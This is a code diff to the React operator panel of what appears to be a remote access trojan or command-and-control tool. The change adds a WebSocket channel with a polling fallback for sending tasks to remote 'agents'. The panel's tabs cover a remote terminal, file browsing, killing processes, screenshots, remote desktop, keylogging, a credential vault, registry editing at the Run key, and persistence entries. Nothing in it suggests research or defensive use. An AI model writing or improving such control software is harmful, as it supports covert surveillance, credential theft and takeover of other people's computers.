@@ -2,6 +2,7 @@ import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { api } from '../api';
 import Modal from '../components/Modal';
 import ConfirmModal from '../components/ConfirmModal';
+import useInteract from '../hooks/useInteract';
 
 /* ========== HELPERS ========== */
 
@@ -45,6 +46,32 @@ async function sendAndPoll(agentId, taskType, args, onResult, onProgress, timeou
     onResult(null); // timeout
   } catch (e) {
     onResult(null);
+  }
+}
+
+/**
+ * wsSendAndPoll - Tries WebSocket first. Falls back to sendAndPoll if WS is disconnected.
+ * Has same callback API as sendAndPoll for drop-in replacement.
+ */
+function wsSendAndPoll(wsSend, wsConnected, agentId, taskType, args, onResult, onProgress, timeoutMs = 60000) {
+  if (wsConnected && wsSend) {
+    // Use WebSocket path - instant results
+    wsSend(taskType, args, timeoutMs).then(
+      (result) => onResult(result),
+      (err) => {
+        // WebSocket failed, fall back to polling
+        if (err.message === 'Not connected' || err.message === 'Disconnected') {
+          sendAndPoll(agentId, taskType, args, onResult, onProgress, timeoutMs);
+        } else if (err.message === 'Timeout') {
+          onResult(null);
+        } else {
+          onResult(null);
+        }
+      }
+    );
+  } else {
+    // Fallback to polling
+    sendAndPoll(agentId, taskType, args, onResult, onProgress, timeoutMs);
   }
 }
 
@@ -147,6 +174,12 @@ export default function AgentModal({ agent, onClose }) {
   const [toastMsg, showToast] = useToast();
   const [showKillConfirm, setShowKillConfirm] = useState(false);
   const isMobile = useIsMobile();
+  const { connected: wsConnected, send: wsSend } = useInteract(agent.id);
+
+  // Create a bound send wrapper that all tabs can use
+  const interactSend = useCallback((taskType, args, onResult, onProgress, timeoutMs) => {
+    wsSendAndPoll(wsSend, wsConnected, agent.id, taskType, args, onResult, onProgress, timeoutMs);
+  }, [wsSend, wsConnected, agent.id]);
 
   useEffect(() => {
     api.getCredentials('agent_id=' + agent.id).then(setCreds).catch(() => {});
@@ -188,6 +221,11 @@ export default function AgentModal({ agent, onClose }) {
           <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
           <span style={{ color: 'rgba(255,255,255,0.5)' }}>LAST</span>
           <span style={{ color: statusColor }}>{timeSince(agent.last_seen)}</span>
+          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
+          <span style={{ display: 'inline-flex', alignItems: 'center', gap: 4 }}>
+            <span style={{ width: 6, height: 6, background: wsConnected ? 'var(--green)' : 'var(--red)', display: 'inline-block', borderRadius: '50%', animation: wsConnected ? 'pulse 2s infinite' : 'none' }} />
+            <span style={{ color: wsConnected ? 'var(--green)' : 'var(--red)', fontSize: 9, fontWeight: 600 }}>{wsConnected ? 'LIVE' : 'POLL'}</span>
+          </span>
         </div>
         <div style={{ display: 'flex', gap: isMobile ? 4 : 6, flexShrink: 0 }}>
           <HeaderBtn label={isMobile ? '📸' : '⬜ Screenshot'} onClick={() => { api.createTask(agent.id, 'display_capture', {}); showToast('📸 Screenshot captured'); }} />
@@ -221,15 +259,15 @@ export default function AgentModal({ agent, onClose }) {
 
       {/* TAB CONTENT */}
       <div style={{ flex: 1, overflow: 'auto', display: 'flex', flexDirection: 'column', WebkitOverflowScrolling: 'touch' }}>
-        {tab === 'terminal' && <TerminalTab agent={agent} showToast={showToast} />}
-        {tab === 'files' && <FilesTab agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
-        {tab === 'processes' && <ProcessesTab agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
+        {tab === 'terminal' && <TerminalTab agent={agent} showToast={showToast} interactSend={interactSend} />}
+        {tab === 'files' && <FilesTab agentId={agent.id} showToast={showToast} isMobile={isMobile} interactSend={interactSend} />}
+        {tab === 'processes' && <ProcessesTab agentId={agent.id} showToast={showToast} isMobile={isMobile} interactSend={interactSend} />}
         {tab === 'display' && <DisplayTab agentId={agent.id} showToast={showToast} />}
         {tab === 'remote' && <RemoteDesktopTab agent={agent} showToast={showToast} />}
         {tab === 'keylog' && <InputLogTab agentId={agent.id} showToast={showToast} />}
         {tab === 'vault' && <VaultTab creds={creds} agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
-        {tab === 'registry' && <RegistryTab agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
-        {tab === 'persistence' && <PersistenceTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'registry' && <RegistryTab agentId={agent.id} showToast={showToast} isMobile={isMobile} interactSend={interactSend} />}
+        {tab === 'persistence' && <PersistenceTab agentId={agent.id} showToast={showToast} interactSend={interactSend} />}
         {tab === 'network' && <NetworkTab agentId={agent.id} showToast={showToast} />}
         {tab === 'settings' && <SettingsTab agentId={agent.id} agent={agent} showToast={showToast} />}
       </div>
@@ -283,7 +321,7 @@ const S = {
 };
 
 /* ========== TERMINAL TAB ========== */
-function TerminalTab({ agent, showToast }) {
+function TerminalTab({ agent, showToast, interactSend }) {
   const [history, setHistory] = useState([]);
   const [input, setInput] = useState('');
   const [working, setWorking] = useState(false);
@@ -303,7 +341,7 @@ function TerminalTab({ agent, showToast }) {
     setWorking(true);
     setPollInfo(null);
 
-    sendAndPoll(agent.id, 'terminal', { cmd }, (result) => {
+    interactSend('terminal', { cmd }, (result) => {
       if (result !== null) {
         setHistory(prev => [...prev, { type: 'output', text: typeof result === 'string' ? result : JSON.stringify(result, null, 2) }]);
       } else {
@@ -386,7 +424,7 @@ function TerminalTab({ agent, showToast }) {
 }
 
 /* ========== FILES TAB (Split Panel) ========== */
-function FilesTab({ agentId, showToast, isMobile }) {
+function FilesTab({ agentId, showToast, isMobile, interactSend }) {
   const [path, setPath] = useState(['C:\\']);
   const [files, setFiles] = useState([]);
   const [loading, setLoading] = useState(false);
@@ -408,7 +446,7 @@ function FilesTab({ agentId, showToast, isMobile }) {
     setError(null);
     setFiles([]);
     setPollProgress(null);
-    sendAndPoll(agentId, 'storage_list', { path: p }, (result) => {
+    interactSend('storage_list', { path: p }, (result) => {
       setLoading(false);
       setPollProgress(null);
       if (result && Array.isArray(result)) {
@@ -561,7 +599,7 @@ function FilesTab({ agentId, showToast, isMobile }) {
 }
 
 /* ========== PROCESSES TAB ========== */
-function ProcessesTab({ agentId, showToast, isMobile }) {
+function ProcessesTab({ agentId, showToast, isMobile, interactSend }) {
   const [processes, setProcesses] = useState([]);
   const [loading, setLoading] = useState(false);
   const [search, setSearch] = useState('');
@@ -575,13 +613,13 @@ function ProcessesTab({ agentId, showToast, isMobile }) {
 
   const fetchProcesses = useCallback(() => {
     setLoading(true);
-    sendAndPoll(agentId, 'task_viewer_list', {}, (result) => {
+    interactSend('task_viewer_list', {}, (result) => {
       setLoading(false);
       if (result && Array.isArray(result)) {
         setProcesses(result);
       }
     });
-  }, [agentId]);
+  }, [interactSend]);
 
   useEffect(() => {
     fetchProcesses();
@@ -616,7 +654,7 @@ function ProcessesTab({ agentId, showToast, isMobile }) {
   });
 
   const killProcess = (pid) => {
-    sendAndPoll(agentId, 'task_viewer_kill', { pid }, () => {
+    interactSend('task_viewer_kill', { pid }, () => {
       showToast(`☠ Killed PID ${pid}`);
       setTimeout(fetchProcesses, 2000);
     });
@@ -646,7 +684,7 @@ function ProcessesTab({ agentId, showToast, isMobile }) {
         <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'rgba(255,255,255,0.3)' }}>{processes.length} processes</span>
         <button style={S.toolBtn} onClick={fetchProcesses} disabled={loading}>{loading ? '⏳...' : '↻ Refresh'}</button>
         <button style={{ ...S.toolBtn, ...S.btnDanger }} onClick={() => {
-          selectedProcs.forEach(pid => sendAndPoll(agentId, 'task_viewer_kill', { pid }, () => {}));
+          selectedProcs.forEach(pid => interactSend('task_viewer_kill', { pid }, () => {}));
           showToast(`☠ Killed ${selectedProcs.size} processes`);
           setSelectedProcs(new Set());
         }} disabled={selectedProcs.size === 0}>Kill Selected</button>
@@ -1103,7 +1141,7 @@ function VaultTab({ creds, agentId, showToast, isMobile }) {
 }
 
 /* ========== REGISTRY TAB (Split Panel) ========== */
-function RegistryTab({ agentId, showToast, isMobile }) {
+function RegistryTab({ agentId, showToast, isMobile, interactSend }) {
   const [hive, setHive] = useState('HKCU');
   const [regPath, setRegPath] = useState('Software\\Microsoft\\Windows\\CurrentVersion\\Run');
   const [pathInput, setPathInput] = useState('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run');
@@ -1142,7 +1180,7 @@ function RegistryTab({ agentId, showToast, isMobile }) {
     setValues([]);
 
     // List subkeys
-    sendAndPoll(agentId, 'config_store_list', { hive: h, path: p }, (result) => {
+    interactSend('config_store_list', { hive: h, path: p }, (result) => {
       setLoading(false);
       if (result && Array.isArray(result)) {
         setSubkeys(result);
@@ -1155,7 +1193,7 @@ function RegistryTab({ agentId, showToast, isMobile }) {
 
     // Also read values (name: "*" reads all, but agent reads one at a time)
     // For now we just list subkeys; values come from clicking
-    sendAndPoll(agentId, 'config_store_read', { hive: h, path: p, name: '(Default)' }, (result) => {
+    interactSend('config_store_read', { hive: h, path: p, name: '(Default)' }, (result) => {
       if (result && typeof result === 'object' && !Array.isArray(result)) {
         setValues([result]);
       }
@@ -1261,13 +1299,13 @@ function RegistryTab({ agentId, showToast, isMobile }) {
 }
 
 /* ========== PERSISTENCE TAB ========== */
-function PersistenceTab({ agentId, showToast }) {
+function PersistenceTab({ agentId, showToast, interactSend }) {
   const [entries, setEntries] = useState([]);
   const [loading, setLoading] = useState(false);
 
   const refresh = () => {
     setLoading(true);
-    sendAndPoll(agentId, 'boot_entries_list', {}, (result) => {
+    interactSend('boot_entries_list', {}, (result) => {
       setLoading(false);
       if (result && Array.isArray(result)) {
         setEntries(result);
@@ -1286,7 +1324,7 @@ function PersistenceTab({ agentId, showToast }) {
 
   const removePersistence = (entry) => {
     const method = entry.type === 'scheduled_task' ? 'schtask' : entry.type === 'startup_folder' ? 'startup_folder' : 'registry';
-    sendAndPoll(agentId, 'boot_entries_remove', { method, name: entry.name, hive: entry.location?.startsWith('HKLM') ? 'HKLM' : 'HKCU' }, (result) => {
+    interactSend('boot_entries_remove', { method, name: entry.name, hive: entry.location?.startsWith('HKLM') ? 'HKLM' : 'HKCU' }, (result) => {
       showToast('🗑 Removed');
       setTimeout(refresh, 2000);
     });
